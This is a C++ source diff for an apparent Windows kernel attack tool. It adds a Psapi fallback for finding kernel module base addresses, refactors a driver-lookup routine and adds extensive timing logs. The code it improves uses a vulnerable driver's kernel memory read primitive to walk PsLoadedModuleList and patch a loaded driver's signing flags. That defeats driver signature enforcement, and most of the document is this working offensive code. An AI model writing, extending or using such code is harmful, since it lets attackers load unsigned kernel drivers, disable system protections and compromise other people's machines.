@@ -87,8 +87,80 @@ static WindowsVersion GetWindowsVersion() {
 
 namespace KernelUtils {
 
+    static bool IsKernelPointer(PVOID value) {
+        return reinterpret_cast<ULONG_PTR>(value) >= 0xFFFF000000000000ULL;
+    }
+
+    static PVOID ResolveDriverBaseWithPsapi(const char* moduleName, ULONGLONG startTick, const char* reason) {
+        if (!moduleName || !moduleName[0]) {
+            return nullptr;
+        }
+
+        LPVOID drivers[4096] = {};
+        DWORD cbNeeded = 0;
+        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
+            KLOG("EnumDeviceDrivers fallback failed target=%s reason=%s gle=%lu elapsed_ms=%llu",
+                moduleName,
+                reason ? reason : "unknown",
+                GetLastError(),
+                static_cast<unsigned long long>(GetTickCount64() - startTick));
+            return nullptr;
+        }
+
+        DWORD count = cbNeeded / sizeof(LPVOID);
+        if (count > static_cast<DWORD>(_countof(drivers))) {
+            count = static_cast<DWORD>(_countof(drivers));
+        }
+        KLOG("EnumDeviceDrivers fallback target=%s reason=%s count=%lu bytes=%lu elapsed_ms=%llu",
+            moduleName,
+            reason ? reason : "unknown",
+            count,
+            cbNeeded,
+            static_cast<unsigned long long>(GetTickCount64() - startTick));
+
+        for (DWORD i = 0; i < count; ++i) {
+            if (!drivers[i]) {
+                continue;
+            }
+
+            char name[MAX_PATH] = {};
+            if (!GetDeviceDriverBaseNameA(drivers[i], name, static_cast<DWORD>(sizeof(name)))) {
+                if (i < 8) {
+                    KLOG("  EnumDeviceDrivers[%lu] base=%p name_query_failed gle=%lu", i, drivers[i], GetLastError());
+                }
+                continue;
+            }
+
+            if (i < 8 || _stricmp(name, moduleName) == 0) {
+                KLOG("  EnumDeviceDrivers[%lu] name='%s' base=%p", i, name, drivers[i]);
+            }
+
+            if (_stricmp(name, moduleName) == 0) {
+                if (!IsKernelPointer(drivers[i])) {
+                    KLOG("EnumDeviceDrivers matched target=%s but base is not kernel-shaped base=%p elapsed_ms=%llu",
+                        moduleName,
+                        drivers[i],
+                        static_cast<unsigned long long>(GetTickCount64() - startTick));
+                    return nullptr;
+                }
+                KLOG("EnumDeviceDrivers resolved target=%s base=%p elapsed_ms=%llu",
+                    moduleName,
+                    drivers[i],
+                    static_cast<unsigned long long>(GetTickCount64() - startTick));
+                return drivers[i];
+            }
+        }
+
+        KLOG("EnumDeviceDrivers fallback did not find target=%s reason=%s elapsed_ms=%llu",
+            moduleName,
+            reason ? reason : "unknown",
+            static_cast<unsigned long long>(GetTickCount64() - startTick));
+        return nullptr;
+    }
+
     PVOID GetKernelModuleBase(const char* moduleName) {
         KLOG("Searching for kernel module: '%s'", moduleName);
+        const ULONGLONG lookupStartTick = GetTickCount64();
         NTSTATUS status;
         ULONG returnLength = 0;
         PVOID buffer = nullptr;
@@ -142,20 +214,11 @@ namespace KernelUtils {
         VirtualFree(buffer, 0, MEM_RELEASE);
 
 
-        if (!result && _stricmp(moduleName, "ntoskrnl.exe") == 0) {
-            KLOG("Fallback: trying EnumDeviceDrivers for ntoskrnl...");
-            LPVOID drivers[1024];
-            DWORD cbNeeded = 0;
-            if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
-                if (cbNeeded >= sizeof(LPVOID) && drivers[0] != nullptr) {
-                    result = drivers[0];
-                    KLOG("  EnumDeviceDrivers: ntoskrnl base=%p", result);
-                } else {
-                    KLOG("  EnumDeviceDrivers: no valid first driver");
-                }
-            } else {
-                KLOG("  EnumDeviceDrivers failed, GLE=%u", GetLastError());
-            }
+        if (!IsKernelPointer(result)) {
+            KLOG("SystemModuleInformation base unavailable target=%s base=%p; trying Psapi fallback",
+                moduleName,
+                result);
+            result = ResolveDriverBaseWithPsapi(moduleName, lookupStartTick, "kernel_module_base");
         }
 
         if (!result) {
@@ -380,36 +443,24 @@ namespace KernelUtils {
 
     BOOL PatchDriverSigningFlags(HANDLE device, PCWSTR driverFileName) {
         KLOG("=== PatchDriverSigningFlags for: %ls ===", driverFileName);
+        const ULONGLONG patchStartTick = GetTickCount64();
         char narrowName[256] = {};
         WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, narrowName, sizeof(narrowName), NULL, NULL);
 
-        PVOID driverBase = nullptr;
-        {
-            ULONG returnLength = 0;
-            NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
-            if (returnLength == 0) return FALSE;
-            PVOID buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-            if (!buffer) return FALSE;
-            NTSTATUS st = NtQuerySystemInformationPtr(11, buffer, returnLength, &returnLength);
-            if (NT_SUCCESS(st)) {
-                PRTL_PROCESS_MODULES modInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
-                for (ULONG i = 0; i < modInfo->NumberOfModules; i++) {
-                    auto& m = modInfo->Modules[i];
-                    const char* name = reinterpret_cast<const char*>(m.FullPathName + m.OffsetToFileName);
-                    if (_stricmp(name, narrowName) == 0) {
-                        driverBase = m.ImageBase;
-                        KLOG("Found driver '%s' at base=%p, size=0x%X", narrowName, driverBase, m.ImageSize);
-                        break;
-                    }
-                }
-            }
-            VirtualFree(buffer, 0, MEM_RELEASE);
-        }
+        ULONG driverImageSize = 0;
+        PVOID driverBase = GetDriverBaseByName(driverFileName, &driverImageSize);
 
         if (!driverBase) {
-            KLOG("ERROR: Driver '%s' not found in loaded modules", narrowName);
+            KLOG("ERROR: Driver '%s' not found in loaded modules elapsed_ms=%llu",
+                narrowName,
+                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
             return FALSE;
         }
+        KLOG("PatchDriverSigningFlags resolved driver '%s' base=%p size=0x%X elapsed_ms=%llu",
+            narrowName,
+            driverBase,
+            driverImageSize,
+            static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
         KLOG("Looking up PsLoadedModuleList...");
         HMODULE localNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
         if (!localNtos) {
@@ -445,10 +496,19 @@ namespace KernelUtils {
         ULONG_PTR headAddr = reinterpret_cast<ULONG_PTR>(pPsLoadedModuleList);
         ULONG_PTR current = listFlink;
 
+        int walkedEntries = 0;
         for (int i = 0; i < 1024 && current != headAddr; i++) {
+            walkedEntries = i + 1;
             PVOID entryDllBase = nullptr;
             status = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x30), &entryDllBase, sizeof(entryDllBase));
-            if (!NT_SUCCESS(status)) break;
+            if (!NT_SUCCESS(status)) {
+                KLOG("PatchDriverSigningFlags list walk read base failed entry=%p index=%d status=0x%08X elapsed_ms=%llu",
+                    reinterpret_cast<PVOID>(current),
+                    i,
+                    static_cast<DWORD>(status),
+                    static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+                break;
+            }
 
             if (entryDllBase == driverBase) {
                 KLOG("Found matching KLDR_DATA_TABLE_ENTRY at %p", (PVOID)current);
@@ -471,26 +531,48 @@ namespace KernelUtils {
                 g_KernelSigningVerified = (verifyFlags & 0x20) != 0;
 
                 if (g_KernelSigningVerified) {
-                    KLOG("Driver signing flag patched OK");
+                    KLOG("Driver signing flag patched OK elapsed_ms=%llu walked=%d",
+                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick),
+                        walkedEntries);
                 } else {
-                    KLOG("WARNING: Flag patch verification failed!");
+                    KLOG("WARNING: Flag patch verification failed elapsed_ms=%llu walked=%d",
+                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick),
+                        walkedEntries);
                 }
                 return TRUE;
             }
 
             ULONG_PTR nextFlink = 0;
-            VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current), &nextFlink, sizeof(nextFlink));
-            if (!nextFlink || nextFlink == current) break;
+            NTSTATUS nextStatus = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current), &nextFlink, sizeof(nextFlink));
+            if (!NT_SUCCESS(nextStatus)) {
+                KLOG("PatchDriverSigningFlags list walk read next failed entry=%p index=%d status=0x%08X elapsed_ms=%llu",
+                    reinterpret_cast<PVOID>(current),
+                    i,
+                    static_cast<DWORD>(nextStatus),
+                    static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+                break;
+            }
+            if (!nextFlink || nextFlink == current) {
+                KLOG("PatchDriverSigningFlags list walk stopped entry=%p index=%d next=%p elapsed_ms=%llu",
+                    reinterpret_cast<PVOID>(current),
+                    i,
+                    reinterpret_cast<PVOID>(nextFlink),
+                    static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+                break;
+            }
             current = nextFlink;
         }
 
-        KLOG("ERROR: Driver base %p not found in PsLoadedModuleList (walked %d entries)",
-             driverBase, 1024);
+        KLOG("ERROR: Driver base %p not found in PsLoadedModuleList walked=%d elapsed_ms=%llu",
+             driverBase,
+             walkedEntries,
+             static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
         return FALSE;
     }
 
     PVOID GetDriverBaseByName(PCWSTR driverFileName, PULONG outImageSize) {
         KLOG("Looking up driver by name: %ls", driverFileName);
+        const ULONGLONG lookupStartTick = GetTickCount64();
 
         if (!NtQuerySystemInformationPtr) {
             KLOG("ERROR: NtQuerySystemInformationPtr is NULL");
@@ -499,6 +581,10 @@ namespace KernelUtils {
 
         ULONG returnLength = 0;
         NTSTATUS status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
+        KLOG("GetDriverBaseByName probe status=0x%08X returnLength=%lu elapsed_ms=%llu",
+            static_cast<DWORD>(status),
+            returnLength,
+            static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
         if (returnLength == 0) {
             return nullptr;
         }
@@ -507,11 +593,20 @@ namespace KernelUtils {
         ULONG bufSize = returnLength + 4096;
         PVOID buffer = VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!buffer) {
+            KLOG("GetDriverBaseByName VirtualAlloc failed size=%lu gle=%lu elapsed_ms=%llu",
+                bufSize,
+                GetLastError(),
+                static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
             return nullptr;
         }
 
         status = NtQuerySystemInformationPtr(11, buffer, bufSize, &returnLength);
         if (!NT_SUCCESS(status)) {
+            KLOG("GetDriverBaseByName query failed status=0x%08X bufSize=%lu returnLength=%lu elapsed_ms=%llu",
+                static_cast<DWORD>(status),
+                bufSize,
+                returnLength,
+                static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
             VirtualFree(buffer, 0, MEM_RELEASE);
             return nullptr;
         }
@@ -519,12 +614,19 @@ namespace KernelUtils {
 
         PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
         PVOID result = nullptr;
+        PVOID redactedResult = nullptr;
         ULONG resultSize = 0;
+        ULONG moduleCount = moduleInfo->NumberOfModules;
 
         char targetNarrow[260] = {};
         WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, targetNarrow, sizeof(targetNarrow), NULL, NULL);
+        KLOG("GetDriverBaseByName module_count=%lu target=%s bufSize=%lu returnLength=%lu",
+            moduleCount,
+            targetNarrow,
+            bufSize,
+            returnLength);
 
-        for (ULONG i = 0; i < moduleInfo->NumberOfModules; i++) {
+        for (ULONG i = 0; i < moduleCount; i++) {
             auto& mod = moduleInfo->Modules[i];
             const char* fileName = reinterpret_cast<const char*>(
                 mod.FullPathName + mod.OffsetToFileName);
@@ -532,16 +634,40 @@ namespace KernelUtils {
             if (i == 0) {
                 KLOG("  First module: '%s' Base=%p Size=0x%X", fileName, mod.ImageBase, mod.ImageSize);
             }
+            if (i < 8) {
+                KLOG("  Module[%lu]: '%s' Base=%p Size=0x%X Offset=%u",
+                    i,
+                    fileName,
+                    mod.ImageBase,
+                    mod.ImageSize,
+                    static_cast<unsigned int>(mod.OffsetToFileName));
+            }
 
             if (_stricmp(fileName, targetNarrow) == 0) {
                 result = mod.ImageBase;
+                redactedResult = mod.ImageBase;
                 resultSize = mod.ImageSize;
-                KLOG("  FOUND '%s' Base=%p Size=0x%X", targetNarrow, result, resultSize);
+                KLOG("  FOUND '%s' Base=%p Size=0x%X index=%lu elapsed_ms=%llu",
+                    targetNarrow,
+                    result,
+                    resultSize,
+                    i,
+                    static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
                 break;
             }
         }
 
         VirtualFree(buffer, 0, MEM_RELEASE);
+
+        if (!IsKernelPointer(result)) {
+            if (redactedResult) {
+                KLOG("GetDriverBaseByName target=%s SystemModuleInformation returned noncanonical base=%p size=0x%X; trying Psapi fallback",
+                    targetNarrow,
+                    redactedResult,
+                    resultSize);
+            }
+            result = ResolveDriverBaseWithPsapi(targetNarrow, lookupStartTick, "driver_base_by_name");
+        }
 
         if (result) {
             if (outImageSize)
@@ -549,7 +675,10 @@ namespace KernelUtils {
             return result;
         }
 
-        KLOG("WARNING: Driver '%s' not found in loaded modules", targetNarrow);
+        KLOG("WARNING: Driver '%s' not found in loaded modules count=%lu elapsed_ms=%llu",
+            targetNarrow,
+            moduleCount,
+            static_cast<unsigned long long>(GetTickCount64() - lookupStartTick));
         return nullptr;
     }
 
